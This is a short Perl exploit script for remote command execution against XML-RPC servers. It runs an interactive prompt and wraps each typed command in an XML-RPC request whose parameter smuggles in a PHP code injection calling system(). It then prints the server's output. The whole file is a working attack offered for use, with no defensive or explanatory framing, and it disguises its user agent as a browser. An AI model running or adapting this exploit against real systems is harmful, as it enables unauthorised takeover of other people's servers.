#!/usr/bin/perl -w
# ********************************
# XML-RPC Remote Command Execution
# ********************************

use LWP::UserAgent;

$brws = new LWP::UserAgent;
$brws->agent("Internet Explorer 8.0");

$host = $ARGV[0]; 

if ( !$host ) 
{ 
	die("Usage: xmlrpcexec.pl http://pathto/xmlrpcserver"); 
}

while ( $host ) 
{

	print "xmlrpc\@\#";
	
	$exec = <STDIN>;	
	$data = "<?xml version=\"1.0\"?><methodCall><methodName>foo.bar</methodName><params><param><value><string>1</string></value></param><param><value><string>1</string></value></param><param><value><string>1</string></value></param><param><value><string>1</string></value></param><param><value><name>','')); system('$exec'); die; /*</name></value></param></params></methodCall>";
	
	$send = new HTTP::Request POST => $host;
	$send->content($data);
	$gots = $brws->request($send);	
	$show = $gots->content;
	
	if ( $show =~ /<b>([\d]{1,10})<\/b><br \/>(.*)/is )
	{
	    print $2 . "\n";
	}
	else
	{
		print "$show\n";
	}


}

